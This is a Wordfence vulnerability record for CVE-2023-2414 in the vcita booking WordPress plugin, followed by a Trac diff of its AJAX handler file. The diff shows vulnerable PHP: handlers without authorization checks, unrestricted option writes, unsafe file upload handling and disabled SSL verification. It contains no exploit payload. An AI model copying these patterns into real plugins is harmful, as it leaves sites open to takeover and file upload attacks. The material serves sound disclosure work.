=== Content from www.wordfence.com_ba53704e_20250111_012718.html ===


[![](https://www.wordfence.com/img/wordfence-intelligence-logo.svg)](/threat-intel/)

Have you found a vulnerability in a WordPress plugin or theme? Report vulnerabilities in WordPress plugins and themes through our [bug bounty program](https://www.wordfence.com/threat-intel/bug-bounty-program) and earn a bounty on all in-scope submissions, while we handle the responsible disclosure process on your behalf.

As a reminder, the Wordfence Intelligence Vulnerability Database API is completely free to query and utilize, both personally and commercially, and contains all the same vulnerability data as the user interface. Please review the API documentation and Webhook documentation for more information on how to query the vulnerability API endpoints and configure webhooks utilizing all the same data present in the Wordfence Intelligence user interface.

# Online Booking & Scheduling Calendar for WordPress by vcita <= 4.4.6 - Missing Authorization to Settings Update and Arbitrary File Upload

 [Wordfence Intelligence](https://www.wordfence.com/threat-intel)   >    [Vulnerability Database](https://www.wordfence.com/threat-intel/vulnerabilities)   >   Online Booking & Scheduling Calendar for WordPress by vcita <= 4.4.6 - Missing Authorization to Settings Update and Arbitrary File Upload

5.4

**Missing Authorization**
**CVSS Vector**
[CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:L](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:L)

| CVE | [CVE-2023-2414](https://www.cve.org/CVERecord?id=CVE-2023-2414) |
| --- | --- |
| CVSS | 5.4 (Medium) |
| Publicly Published | June 2, 2023 |
| Last Updated | November 25, 2024 |
| Researcher | [Jonas Höbenreich](https://www.wordfence.com/threat-intel/vulnerabilities/researchers/jonas-hobenreich) |

### Description

The Online Booking & Scheduling Calendar for WordPress by vcita plugin for WordPress is vulnerable to unauthorized modification of data due to a missing capability check on the vcita\_save\_settings\_callback function in versions up to, and including, 4.4.6. This makes it possible for authenticated attackers with minimal permissions, such as a subscriber, to modify the plugins settings, upload arbitrary files, and inject malicious JavaScript (before 4.3.2).

#### References

* [plugins.trac.wordpress.org](https://plugins.trac.wordpress.org/browser/meeting-scheduler-by-vcita/trunk/vcita-ajax-function.php#L88)
* [blog.jonh.eu](https://blog.jonh.eu/blog/security-vulnerabilities-in-wordpress-plugins-by-vcita)
* [plugins.trac.wordpress.org](https://plugins.trac.wordpress.org/changeset/2933915/meeting-scheduler-by-vcita/trunk/vcita-ajax-function.php?contextall=1&old=2924763&old_path=%2Fmeeting-scheduler-by-vcita%2Ftrunk%2Fvcita-ajax-function.php)
* [plugins.trac.wordpress.org](https://plugins.trac.wordpress.org/changeset/3191356/meeting-scheduler-by-vcita/trunk/vcita-ajax-function.php?contextall=1)

#### Share

[Facebook](https://www.facebook.com/sharer/sharer.php?u=http%3A%2F%2Fwww.wordfence.com%2Fthreat-intel%2Fvulnerabilities%2Fwordpress-plugins%2Fmeeting-scheduler-by-vcita%2Fonline-booking-scheduling-calendar-for-wordpress-by-vcita-4210-missing-authorization-to-settings-update-and-media-upload&t=Online%20Booking%20%26%20Scheduling%20Calendar%20for%20WordPress%20by%20vcita%20%3C%3D%204.4.6%20-%20Missing%20Authorization%20to%20Settings%20Update%20and%20Arbitrary%20File%20Upload "Facebook")
[Twitter](https://twitter.com/share?url=http%3A%2F%2Fwww.wordfence.com%2Fthreat-intel%2Fvulnerabilities%2Fwordpress-plugins%2Fmeeting-scheduler-by-vcita%2Fonline-booking-scheduling-calendar-for-wordpress-by-vcita-4210-missing-authorization-to-settings-update-and-media-upload&text=Online%20Booking%20%26%20Scheduling%20Calendar%20for%20WordPress%20by%20vcita%20%3C%3D%204.4.6%20-%20Missing%20Authorization%20to%20Settings%20Update%20and%20Arbitrary%20File%20Upload "Twitter")
[LinkedIn](https://www.linkedin.com/shareArticle?url=http%3A%2F%2Fwww.wordfence.com%2Fthreat-intel%2Fvulnerabilities%2Fwordpress-plugins%2Fmeeting-scheduler-by-vcita%2Fonline-booking-scheduling-calendar-for-wordpress-by-vcita-4210-missing-authorization-to-settings-update-and-media-upload "LinkedIn")
Email

## Vulnerability Details for Online Booking & Scheduling Calendar for WordPress by vcita

#### [Online Booking & Scheduling Calendar for WordPress by vcita](https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/meeting-scheduler-by-vcita)

| Software Type | Plugin |
| --- | --- |
| Software Slug | meeting-scheduler-by-vcita [(view on wordpress.org)](https://wordpress.org/plugins/meeting-scheduler-by-vcita) |
| Patched? | Yes |
| Remediation | Update to version 4.5, or a newer patched version |
| Affected Version | * <= 4.4.6 |
| Patched Version | * 4.5 |

This record contains material that is subject to copyright.

**Copyright 2012-2025 Defiant Inc.**

**License:**
Defiant hereby grants you a perpetual, worldwide, non-exclusive, no-charge, royalty-free, irrevocable copyright license to reproduce, prepare derivative works of, publicly display, publicly perform, sublicense, and distribute this software vulnerability information. Any copy of the software vulnerability information you make for such purposes is authorized provided that you include a hyperlink to this vulnerability record and reproduce Defiant's copyright designation and this license in any such copy.
**[Read more.](https://www.wordfence.com/wordfence-intelligence-terms-and-conditions/)**

**Copyright 1999-2025 The MITRE Corporation**

**License:**
CVE Usage: MITRE hereby grants you a perpetual, worldwide, non-exclusive, no-charge, royalty-free, irrevocable copyright license to reproduce, prepare derivative works of, publicly display, publicly perform, sublicense, and distribute Common Vulnerabilities and Exposures (CVE®). Any copy you make for such purposes is authorized provided that you reproduce MITRE's copyright designation and this license in any such copy.
**[Read more.](https://www.cve.org/Legal/TermsOfUse)**

Have information to add, or spot any errors? Contact us at wfi-support@wordfence.com so we can make any appropriate adjustments.

Did you know Wordfence Intelligence provides free personal and commercial API access to our comprehensive WordPress vulnerability database, along with a free webhook integration to stay on top of the latest vulnerabilities added and updated in the database? Get started today!

Learn more

Want to get notified of the latest vulnerabilities that may affect your WordPress site?
 Install Wordfence on your site today to get notified immediately if your site is affected by a vulnerability that has been added to our database.

Get Wordfence

The Wordfence Intelligence WordPress vulnerability database is completely free to access and query via API. Please review the documentation on how to access and consume the vulnerability data via API.

Documentation



=== Content from plugins.trac.wordpress.org_e8ab2762_20250111_012717.html ===


[Skip to content](#main)

[WordPress.org](https://wordpress.org/)

* [News](https://wordpress.org/news/)
* [Download & Extend](https://wordpress.org/download/)
  + [Get WordPress](https://wordpress.org/download/)
  + [Themes](https://wordpress.org/themes/)
  + [Patterns](https://wordpress.org/patterns/)
  + [Plugins](https://wordpress.org/plugins/)
  + [Mobile](https://wordpress.org/mobile/)
  + [Hosting](https://wordpress.org/hosting/)
  + [Openverse ↗︎](https://openverse.org/)
* [Learn](https://learn.wordpress.org/)
  + [Learn WordPress](https://learn.wordpress.org/)
  + [Documentation](https://wordpress.org/documentation/)
  + [Forums](https://wordpress.org/support/forums/)
  + [Developers](https://developer.wordpress.org/)
  + [WordPress.tv ↗︎](https://wordpress.tv/)
* [Community](https://make.wordpress.org/)
  + [Make WordPress](https://make.wordpress.org/)
  + [Photo Directory](https://wordpress.org/photos/)
  + [Five for the Future](https://wordpress.org/five-for-the-future/)
  + [WordCamp ↗︎](https://central.wordcamp.org/)
  + [Meetups ↗︎](https://www.meetup.com/pro/wordpress/)
  + [Job Board ↗︎](https://jobs.wordpress.net/)
* [About](https://wordpress.org/about/)
  + [About WordPress](https://wordpress.org/about/)
  + [Showcase](https://wordpress.org/showcase/)
  + [Enterprise](https://wordpress.org/enterprise/)
  + [Gutenberg ↗︎](https://wordpress.org/gutenberg/)
  + [WordPress Swag Store ↗︎](https://mercantile.wordpress.org/)
* [Get WordPress](https://wordpress.org/download/)

Search Trac

[Get WordPress](https://wordpress.org/download/)

## [Plugin Directory](//wordpress.org/plugins/)

Search:

* [Login](https://login.wordpress.org/?redirect_to=http%3A%2F%2Fplugins.trac.wordpress.org%2Fchangeset%2F2933915%2Fmeeting-scheduler-by-vcita%2Ftrunk%2Fvcita-ajax-function.php%3Fcontextall%3D1%26old%3D2924763%26old_path%3D%252Fmeeting-scheduler-by-vcita%252Ftrunk%252Fvcita-ajax-function.php)

* [Timeline](/timeline)
* [View Tickets](/report)
* [Browse Source](/browser)

## Context Navigation

* [Reverse Diff](/changeset/2924763/meeting-scheduler-by-vcita/trunk/vcita-ajax-function.php?old=2933915&old_path=%2Fmeeting-scheduler-by-vcita%2Ftrunk%2Fvcita-ajax-function.php)

---

# Changes in [meeting-scheduler-by-vcita/trunk/vcita-ajax-function.php](/browser/meeting-scheduler-by-vcita/trunk/vcita-ajax-function.php?rev=2933915 "Show entry in browser") [[2924763:2933915]](/log/meeting-scheduler-by-vcita/trunk/vcita-ajax-function.php?rev=2933915&stop_rev=2924763 "Show revision log")

View differences
inline
side by side

Show
lines around each change

Show the changes in full context

Ignore:

Blank lines

Case changes

White space changes

File:

1 edited

* [meeting-scheduler-by-vcita/trunk/vcita-ajax-function.php](/browser/meeting-scheduler-by-vcita/trunk/vcita-ajax-function.php?rev=2933915 "Show entry in browser")
  (modified)
  ([1 diff](#file0 "Show differences"))

### Legend:

Unmodified
Added
Removed

* ## [meeting-scheduler-by-vcita/trunk/vcita-ajax-function.php](/changeset/2933915/meeting-scheduler-by-vcita/trunk/vcita-ajax-function.php?old=2924763&old_path=meeting-scheduler-by-vcita%2Ftrunk%2Fvcita-ajax-function.php "Show the [2924763:2933915] differences restricted to meeting-scheduler-by-vcita/trunk/vcita-ajax-function.php")

  | [r2924763](/browser/meeting-scheduler-by-vcita/trunk/vcita-ajax-function.php?rev=2924763#L1 "Show revision 2924763 of this file in browser") | [r2933915](/browser/meeting-scheduler-by-vcita/trunk/vcita-ajax-function.php?rev=2933915#L1 "Show revision 2933915 of this file in browser") |  |
  | --- | --- | --- |
  | 1 | 1 | <?php |
  | 2 | 2 |  |
  | 3 | 3 | add\_action('wp\_ajax\_vcita\_dismiss', 'vcita\_dismiss'); |
  | 4 | 4 | add\_action('wp\_ajax\_vcita\_logout', 'vcita\_logout\_callback'); |
  | 5 | 5 | add\_action('wp\_ajax\_vcita\_check\_auth', 'vcita\_check\_auth'); |
  | 6 | 6 | add\_action('wp\_ajax\_vcita\_save\_settings', 'vcita\_save\_settings\_callback'); |
  | 7 | 7 | add\_action('wp\_ajax\_vcita\_save\_data', 'vcita\_save\_user\_data\_callback'); |
  | 8 | 8 | add\_action('wp\_ajax\_vcita\_deactivate\_others', 'vcita\_vcita\_deactivate\_others\_callback'); |
  | 9 | 9 |  |
  | 10 | 10 | function vcita\_dismiss() |
  | 11 | 11 | { |
  | 12 | 12 | if (isset($\_GET['dismiss'])) { |
  | 13 | 13 | $wpshd\_vcita\_widget = (array)get\_option(WPSHD\_VCITA\_WIDGET\_KEY); |
  | 14 | 14 | $wpshd\_vcita\_widget['dismiss'] = true; |
  | 15 | 15 | $wpshd\_vcita\_widget['dismiss\_time'] = microtime(true); |
  | 16 | 16 | update\_option(WPSHD\_VCITA\_WIDGET\_KEY, $wpshd\_vcita\_widget); |
  | 17 | 17 | echo 'dismissed'; |
  | 18 | 18 | wp\_die(); |
  | 19 | 19 | } else if (isset($\_GET['dismiss\_switch'])) { |
  | 20 | 20 | $wpshd\_vcita\_widget = (array)get\_option(WPSHD\_VCITA\_WIDGET\_KEY); |
  | 21 | 21 | $wpshd\_vcita\_widget['dismiss\_switch'] = true; |
  | 22 | 22 | $wpshd\_vcita\_widget['dismiss\_switch\_time'] = microtime(true); |
  | 23 | 23 | update\_option(WPSHD\_VCITA\_WIDGET\_KEY, $wpshd\_vcita\_widget); |
  | 24 | 24 | echo 'dismissed'; |
  | 25 | 25 | wp\_die(); |
  | 26 | 26 | } else if (isset($\_GET['switch\_on'])) { |
  | 27 | 27 | $wpshd\_vcita\_widget = (array)get\_option(WPSHD\_VCITA\_WIDGET\_KEY); |
  | 28 | 28 | $wpshd\_vcita\_widget['dismiss\_switch'] = false; |
  | 29 | 29 | unset($wpshd\_vcita\_widget['dismiss\_switch\_time']); |
  | 30 | 30 | $wpshd\_vcita\_widget['show\_on\_site'] = 1; |
  | 31 | 31 | update\_option(WPSHD\_VCITA\_WIDGET\_KEY, $wpshd\_vcita\_widget); |
  | 32 | 32 | echo 'dismissed'; |
  | 33 | 33 | wp\_die(); |
  | 34 | 34 | } |
  | 35 | 35 | } |
  | 36 | 36 |  |
  | 37 | 37 | function vcita\_check\_auth() |
  | 38 | 38 | { |
  | 39 | 39 | $wpshd\_vcita\_widget = (array)get\_option(WPSHD\_VCITA\_WIDGET\_KEY); |
  | 40 | 40 | echo json\_encode($wpshd\_vcita\_widget); |
  | 41 | 41 | wp\_die(); |
  | 42 | 42 | } |
  | 43 | 43 |  |
  | 44 | 44 | function vcita\_vcita\_deactivate\_others\_callback() |
  | 45 | 45 | { |
  | 46 | 46 | $av\_plugin\_list = wp\_cache\_get('WPSHD\_VCITA\_ANOTHER\_PLUGIN\_LIST'); |
  | 47 | 47 | $found = array(); |
  | 48 | 48 | foreach ($av\_plugin\_list as $av\_plugin) $found[] = $av\_plugin['file']; |
  | 49 | 49 | deactivate\_plugins($found); |
  | 50 | 50 |  |
  | 51 | 51 | echo 'success'; |
  | 52 | 52 | wp\_die(); |
  | 53 | 53 | } |
  | 54 | 54 |  |
  | 55 | 55 | function vcita\_logout\_callback() |
  | 56 | 56 | { |
  | 57 | 57 | if ( current\_user\_can('delete\_plugins') ) { |
  | 58 | 58 | $wpshd\_vcita\_widget = wpshd\_vcita\_clean\_expert\_data(); |
  | 59 | 59 | $wpshd\_vcita\_widget['dismiss'] = false; |
  | 60 | 60 | unset($wpshd\_vcita\_widget['dismiss\_time']); |
  | 61 | 61 |  |
  | 62 | 62 | if (isset($wpshd\_vcita\_widget['wp\_id']) && $wpshd\_vcita\_widget['wp\_id']) { |
  | 63 | 63 | vcita\_send\_get('https://us-central1-scheduler-272415.cloudfunctions.net/scheduler-proxy/logout/' . $wpshd\_vcita\_widget['wp\_id']); |
  | 64 | 64 | } |
  | 65 | 65 |  |
  | 66 | 66 | update\_option(WPSHD\_VCITA\_WIDGET\_KEY, $wpshd\_vcita\_widget); |
  | 67 | 67 | echo 'logged out'; |
  | 68 | 68 | wp\_die(); |
  | 69 | 69 | } |
  | 70 | 70 | } |
  | 71 | 71 |  |
  | 72 | 72 | function vcita\_save\_user\_data\_callback() |
  | 73 | 73 | { |
  | 74 | 74 | header('Content-Type: application/json'); |
  | 75 | 75 | $response = array(); |
  | 76 | 76 |  |
  | 77 | 77 | if (isset($\_REQUEST['data\_name']) && isset($\_REQUEST['data\_val'])) { |
  | 78 | 78 | $wpshd\_vcita\_widget = (array)get\_option(WPSHD\_VCITA\_WIDGET\_KEY); |
  | 79 | 79 | $wpshd\_vcita\_widget[$\_REQUEST['data\_name']] = $\_REQUEST['data\_val']; |
  | 80 | 80 | update\_option(WPSHD\_VCITA\_WIDGET\_KEY, $wpshd\_vcita\_widget); |
  | 81 | 81 | $response['success'] = true; |
  | 82 | 82 | } else { |
  | 83 | 83 | $response['error'] = 'Request invalid'; |
  | 84 | 84 | } |
  | 85 | 85 |  |
  | 86 | 86 | echo json\_encode($response); |
  | 87 | 87 | wp\_die(); |
  | 88 | 88 | } |
  | 89 | 89 |  |
  | 90 | 90 | function vcita\_save\_settings\_callback() |
  | 91 | 91 | { |
  | 92 | 92 | header('Content-Type: application/json'); |
  | 93 | 93 | $response = array(); |
  | 94 | 94 |  |
  | 95 | 95 | if (isset($\_POST['btn\_text']) || isset($\_POST['btn\_color']) || isset($\_POST['txt\_color']) || |
  | 96 | 96 | isset($\_POST['show\_on\_site']) || isset($\_POST['widget\_title']) || isset($\_POST['widget\_title']) || |
  | 97 | 97 | isset($\_POST['txt\_color']) || isset($\_POST['widget\_show']) || isset($\_POST['widget\_text']) || |
  | 98 | 98 | isset($\_FILES['widget\_img']) || isset($\_POST['calendar\_page\_active']) || isset($\_POST['contact\_page\_active']) || |
  | 99 | 99 | isset($\_POST['hover\_color']) || isset($\_POST['vcita\_design']) |
  | 100 | 100 | ) { |
  | 101 | 101 | $wpshd\_vcita\_widget = (array)get\_option(WPSHD\_VCITA\_WIDGET\_KEY); |
  | 102 | 102 |  |
  | 103 | 103 | if (isset($\_POST['show\_on\_site'])) { |
  | 104 |  | $wpshd\_vcita\_widget['show\_on\_site'] = ~~$\_POST['show\_on\_site']~~; |
  |  | 104 | $wpshd\_vcita\_widget['show\_on\_site'] = filter\_var($\_POST['show\_on\_site'], FILTER\_VALIDATE\_INT); |
  | 105 | 105 |  |
  | 106 | 106 | if ($\_POST['show\_on\_site']) { |
  | 107 | 107 | $wpshd\_vcita\_widget['dismiss\_switch'] = false; |
  | 108 | 108 | unset($wpshd\_vcita\_widget['dismiss\_switch\_time']); |
  | 109 | 109 | } |
  | 110 | 110 | } |
  | 111 | 111 |  |
  | 112 | 112 | if (isset($\_POST['vcita\_design'])) { |
  | 113 |  | $wpshd\_vcita\_widget['vcita\_design'] = ~~$\_POST['vcita\_design']~~; |
  |  | 113 | $wpshd\_vcita\_widget['vcita\_design'] = filter\_var($\_POST['vcita\_design'], FILTER\_VALIDATE\_INT); |
  | 114 | 114 | } |
  | 115 | 115 |  |
  | 116 | 116 | if (isset($\_POST['btn\_text'])) { |
  | 117 | 117 | $wpshd\_vcita\_widget['btn\_text'] = htmlentities($\_POST['btn\_text']); |
  | 118 | 118 | } |
  | 119 | 119 |  |
  | 120 | 120 | if (isset($\_POST['btn\_color'])) { |
  | 121 |  | $wpshd\_vcita\_widget['btn\_color'] = ~~$\_POST['btn\_color']~~; |
  |  | 121 | $wpshd\_vcita\_widget['btn\_color'] = filter\_var($\_POST['btn\_color'], FILTER\_SANITIZE\_SPECIAL\_CHARS, FILTER\_FLAG\_ENCODE\_HIGH); |
  | 122 | 122 | } |
  | 123 | 123 |  |
  | 124 | 124 | if (isset($\_POST['txt\_color'])) { |
  | 125 |  | $wpshd\_vcita\_widget['txt\_color'] = ~~$\_POST['txt\_color']~~; |
  |  | 125 | $wpshd\_vcita\_widget['txt\_color'] = filter\_var($\_POST['txt\_color'], FILTER\_SANITIZE\_SPECIAL\_CHARS, FILTER\_FLAG\_ENCODE\_HIGH); |
  | 126 | 126 | } |
  | 127 | 127 |  |
  | 128 | 128 | if (isset($\_POST['hover\_color'])) { |
  | 129 |  | $wpshd\_vcita\_widget['hover\_color'] = ~~$\_POST['hover\_color']~~; |
  |  | 129 | $wpshd\_vcita\_widget['hover\_color'] = filter\_var($\_POST['hover\_color'], FILTER\_SANITIZE\_SPECIAL\_CHARS, FILTER\_FLAG\_ENCODE\_HIGH); |
  | 130 | 130 | } |
  | 131 | 131 |  |
  | 132 | 132 | if (isset($\_POST['widget\_title'])) { |
  | 133 | 133 | $wpshd\_vcita\_widget['widget\_title'] = htmlentities($\_POST['widget\_title']); |
  | 134 | 134 | } |
  | 135 | 135 |  |
  | 136 | 136 | if (isset($\_POST['txt\_color'])) { |
  | 137 |  | $wpshd\_vcita\_widget['txt\_color'] = ~~$\_POST['txt\_color']~~; |
  |  | 137 | $wpshd\_vcita\_widget['txt\_color'] = filter\_var($\_POST['txt\_color'], FILTER\_SANITIZE\_SPECIAL\_CHARS, FILTER\_FLAG\_ENCODE\_HIGH); |
  | 138 | 138 | } |
  | 139 | 139 |  |
  | 140 | 140 | if (isset($\_POST['widget\_show'])) { |
  | 141 |  | $wpshd\_vcita\_widget['widget\_show'] = ~~$\_POST['widget\_show']~~; |
  |  | 141 | $wpshd\_vcita\_widget['widget\_show'] = filter\_var($\_POST['widget\_show'], FILTER\_SANITIZE\_SPECIAL\_CHARS, FILTER\_FLAG\_ENCODE\_HIGH); |
  | 142 | 142 | } |
  | 143 | 143 |  |
  | 144 | 144 | if (isset($\_POST['widget\_text'])) { |
  | 145 | 145 | $wpshd\_vcita\_widget['widget\_text'] = htmlentities($\_POST['widget\_text']); |
  | 146 | 146 | } |
  | 147 | 147 |  |
  | 148 | 148 | if (isset($\_POST['widget\_img\_clear']) && $\_POST['widget\_img\_clear']) { |
  | 149 | 149 | if (!empty($wpshd\_vcita\_widget['widget\_img'])) { |
  | 150 | 150 | wp\_delete\_attachment($wpshd\_vcita\_widget['widget\_img'], true); |
  | 151 | 151 | $wpshd\_vcita\_widget['widget\_img'] = ''; |
  | 152 | 152 | } |
  | 153 | 153 | } |
  | 154 | 154 |  |
  | 155 | 155 | if (isset($\_POST['calendar\_page\_active'])) { |
  | 156 | 156 | if ($\_POST['calendar\_page\_active'] && $wpshd\_vcita\_widget['uid']) { |
  | 157 | 157 | wpshd\_vcita\_make\_sure\_calendar\_page\_published($wpshd\_vcita\_widget, true); |
  | 158 | 158 | $wpshd\_vcita\_widget['calendar\_page\_active'] = 1; |
  | 159 | 159 | } else { |
  | 160 | 160 | wpshd\_vcita\_trash\_current\_calendar\_page($wpshd\_vcita\_widget); |
  | 161 | 161 | $wpshd\_vcita\_widget['calendar\_page\_active'] = 0; |
  | 162 | 162 | } |
  | 163 | 163 | } |
  | 164 | 164 |  |
  | 165 | 165 | if (isset($\_POST['contact\_page\_active'])) { |
  | 166 | 166 | if ($\_POST['contact\_page\_active'] && $wpshd\_vcita\_widget['uid']) { |
  | 167 | 167 | wpshd\_vcita\_make\_sure\_page\_published($wpshd\_vcita\_widget, true); |
  | 168 | 168 | $wpshd\_vcita\_widget['contact\_page\_active'] = 1; |
  | 169 | 169 | } else { |
  | 170 | 170 | wpshd\_vcita\_trash\_contact\_page($wpshd\_vcita\_widget); |
  | 171 | 171 | $wpshd\_vcita\_widget['contact\_page\_active'] = 0; |
  | 172 | 172 | } |
  | 173 | 173 | } |
  | 174 | 174 |  |
  | 175 | 175 | function isFileImage($mimeType) |
  | 176 | 176 | { |
  | 177 | 177 | return in\_array($mimeType, ['image/jpeg', 'image/png', 'image/gif']); |
  | 178 | 178 | } |
  | 179 | 179 |  |
  | 180 | 180 | if (isset($\_FILES['widget\_img']) && $\_FILES['widget\_img']['error'] == UPLOAD\_ERR\_OK) { |
  | 181 | 181 |  |
  | 182 | 182 | if (!isFileImage($\_FILES['widget\_img']['type'])) { |
  | 183 | 183 | $response['error'] = 'Invalid file type must be jpeg, png or gif'; |
  | 184 | 184 |  |
  | 185 | 185 | echo json\_encode($response); |
  | 186 | 186 | wp\_die(); |
  | 187 | 187 | } |
  | 188 | 188 |  |
  | 189 | 189 | require\_once($\_SERVER['DOCUMENT\_ROOT'] . '/wp-load.php'); |
  | 190 | 190 |  |
  | 191 | 191 | $wordpress\_upload\_dir = wp\_upload\_dir(); |
  | 192 | 192 | $i = 1; |
  | 193 | 193 |  |
  | 194 | 194 | $widget\_img = $\_FILES['widget\_img']; |
  | 195 | 195 | $new\_file\_path = $wordpress\_upload\_dir['path'] . '/' . $widget\_img['name']; |
  | 196 | 196 | $new\_file\_mime = mime\_content\_type($widget\_img['tmp\_name']); |
  | 197 | 197 | $\_error = false; |
  | 198 | 198 |  |
  | 199 | 199 | if (empty($widget\_img)) $\_error = true; |
  | 200 | 200 | if ($widget\_img['error']) $\_error = true; |
  | 201 | 201 | if ($widget\_img['size'] > wp\_max\_upload\_size()) $\_error = true; |
  | 202 | 202 | if (!in\_array($new\_file\_mime, get\_allowed\_mime\_types())) $\_error = true; |
  | 203 | 203 |  |
  | 204 | 204 | while (file\_exists($new\_file\_path)) { |
  | 205 | 205 | $i++; |
  | 206 | 206 | $new\_file\_path = $wordpress\_upload\_dir['path'] . '/' . $i . '\_' . $widget\_img['name']; |
  | 207 | 207 | } |
  | 208 | 208 |  |
  | 209 | 209 | if ($\_error) { |
  | 210 | 210 | file\_put\_contents(dirname(\_\_FILE\_\_) . '/debug.log', print\_r($\_FILES['widget\_img'], TRUE), FILE\_APPEND); |
  | 211 | 211 | file\_put\_contents(dirname(\_\_FILE\_\_) . '/debug.log', 'error occured', FILE\_APPEND); |
  | 212 | 212 | } |
  | 213 | 213 |  |
  | 214 | 214 | if (move\_uploaded\_file($widget\_img['tmp\_name'], $new\_file\_path) && $\_error === false) { |
  | 215 | 215 | $upload\_id = wp\_insert\_attachment(array( |
  | 216 | 216 | 'guid' => $new\_file\_path, |
  | 217 | 217 | 'post\_mime\_type' => $new\_file\_mime, |
  | 218 | 218 | 'post\_title' => preg\_replace('/\.[^.]+$/', '', $widget\_img['name']), |
  | 219 | 219 | 'post\_content' => '', |
  | 220 | 220 | 'post\_status' => 'inherit' |
  | 221 | 221 | ), $new\_file\_path); |
  | 222 | 222 |  |
  | 223 | 223 | require\_once(ABSPATH . 'wp-admin/includes/image.php'); |
  | 224 | 224 |  |
  | 225 | 225 | wp\_update\_attachment\_metadata($upload\_id, wp\_generate\_attachment\_metadata($upload\_id, $new\_file\_path)); |
  | 226 | 226 | $wpshd\_vcita\_widget['widget\_img'] = $upload\_id; |
  | 227 | 227 | $response['widget\_img'] = wp\_get\_attachment\_image($upload\_id); |
  | 228 | 228 | } |
  | 229 | 229 | } |
  | 230 | 230 |  |
  | 231 | 231 | if (!isset($response['error']) || !$response['error']) { |
  | 232 | 232 | $response['success'] = true; |
  | 233 | 233 | } |
  | 234 | 234 |  |
  | 235 | 235 | update\_option(WPSHD\_VCITA\_WIDGET\_KEY, $wpshd\_vcita\_widget); |
  | 236 | 236 | } else { |
  | 237 | 237 | $response['error'] = 'Nothing to change'; |
  | 238 | 238 | } |
  | 239 | 239 |  |
  | 240 | 240 | echo json\_encode($response); |
  | 241 | 241 | wp\_die(); |
  | 242 | 242 | } |
  | 243 | 243 |  |
  | 244 | 244 | function vcita\_send\_get($url, $options = array()) |
  | 245 | 245 | { |
  | 246 | 246 | $ch = curl\_init(); |
  | 247 | 247 | curl\_setopt($ch, CURLOPT\_URL, $url); |
  | 248 | 248 | curl\_setopt($ch, CURLOPT\_SSL\_VERIFYHOST, 0); |
  | 249 | 249 | curl\_setopt($ch, CURLOPT\_SSL\_VERIFYPEER, 0); |
  | 250 | 250 | curl\_setopt($ch, CURLOPT\_RETURNTRANSFER, 1); |
  | 251 | 251 |  |
  | 252 | 252 | if (isset($options['auth\_token'])) { |
  | 253 | 253 | curl\_setopt($ch, CURLOPT\_HTTPHEADER, array( |
  | 254 | 254 | 'Authorization: Bearer ' . $options['auth\_token'])); |
  | 255 | 255 | } |
  | 256 | 256 |  |
  | 257 | 257 | $output = curl\_exec($ch); |
  | 258 | 258 | $error = curl\_error($ch); |
  | 259 | 259 | $httpcode = curl\_getinfo($ch, CURLINFO\_HTTP\_CODE); |
  | 260 | 260 | curl\_close($ch); |
  | 261 | 261 |  |
  | 262 | 262 | if (empty($error) && $httpcode === 200) { |
  | 263 | 263 | return json\_decode($output, true); |
  | 264 | 264 | } else if (empty($error)) { |
  | 265 | 265 | return array( |
  | 266 | 266 | 'error' => $output, |
  | 267 | 267 | 'description' => 'Request was not successful', |
  | 268 | 268 | 'http\_code' => $httpcode |
  | 269 | 269 | ); |
  | 270 | 270 | } else { |
  | 271 | 271 | return array( |
  | 272 | 272 | 'error' => $error, |
  | 273 | 273 | 'description' => 'request was not successful' |
  | 274 | 274 | ); |
  | 275 | 275 | } |
  | 276 | 276 | } |
  | 277 | 277 |  |
  | 278 | 278 | function vcita\_send\_post($url, $options = array()) |
  | 279 | 279 | { |
  | 280 | 280 | $ch = curl\_init(); |
  | 281 | 281 | curl\_setopt($ch, CURLOPT\_URL, $url); |
  | 282 | 282 | curl\_setopt($ch, CURLOPT\_POST, 1); |
  | 283 | 283 | curl\_setopt($ch, CURLOPT\_SSL\_VERIFYHOST, 0); |
  | 284 | 284 | curl\_setopt($ch, CURLOPT\_SSL\_VERIFYPEER, 0); |
  | 285 | 285 | curl\_setopt($ch, CURLOPT\_RETURNTRANSFER, 1); |
  | 286 | 286 |  |
  | 287 | 287 | if ($options['post\_data']) { |
  | 288 | 288 | curl\_setopt($ch, CURLOPT\_POSTFIELDS, $options['post\_data']); |
  | 289 | 289 | } |
  | 290 | 290 |  |
  | 291 | 291 | if (isset($options['auth\_token'])) { |
  | 292 | 292 | curl\_setopt($ch, CURLOPT\_HTTPHEADER, array( |
  | 293 | 293 | 'Content-Type: application/json', |
  | 294 | 294 | 'Authorization: Bearer ' . $options['auth\_token'])); |
  | 295 | 295 | } |
  | 296 | 296 |  |
  | 297 | 297 | $output = curl\_exec($ch); |
  | 298 | 298 | $error = curl\_error($ch); |
  | 299 | 299 | $httpcode = curl\_getinfo($ch, CURLINFO\_HTTP\_CODE); |
  | 300 | 300 | curl\_close($ch); |
  | 301 | 301 |  |
  | 302 | 302 | if (empty($error) && $httpcode === 200) { |
  | 303 | 303 | return json\_decode($output, true); |
  | 304 | 304 | } else if (empty($error)) { |
  | 305 | 305 | return array( |
  | 306 | 306 | 'error' => $output, |
  | 307 | 307 | 'description' => 'Request was not successful', |
  | 308 | 308 | 'status' => $httpcode |
  | 309 | 309 | ); |
  | 310 | 310 | } else { |
  | 311 | 311 | return array( |
  | 312 | 312 | 'error' => $error, |
  | 313 | 313 | 'description' => 'request was not successful', |
  | 314 | 314 | 'status' => $httpcode |
  | 315 | 315 | ); |
  | 316 | 316 | } |
  | 317 | 317 | } |
  | 318 | 318 |  |
  | 319 | 319 | ?> |

**Note:** See [TracChangeset](/wiki/TracChangeset)
for help on using the changeset viewer.

[Trac UI Preferences](/prefs)
### Download in other formats:

* [Unified Diff](?format=diff&new=2933915&old=2924763&new_path=%2Fmeeting-scheduler-by-vcita%2Ftrunk%2Fvcita-ajax-function.php&old_path=%2Fmeeting-scheduler-by-vcita%2Ftrunk%2Fvcita-ajax-function.php)
* [Zip Archive](?format=zip&new=2933915&old=2924763&new_path=%2Fmeeting-scheduler-by-vcita%2Ftrunk%2Fvcita-ajax-function.php&old_path=%2Fmeeting-scheduler-by-vcita%2Ftrunk%2Fvcita-ajax-function.php)

* [About](https://wordpress.org/about/)
* [News](https://wordpress.org/news/)
* [Hosting](https://wordpress.org/hosting/)
* [Donate](https://wordpressfoundation.org/donate/)
* [Swag](https://mercantile.wordpress.org/)

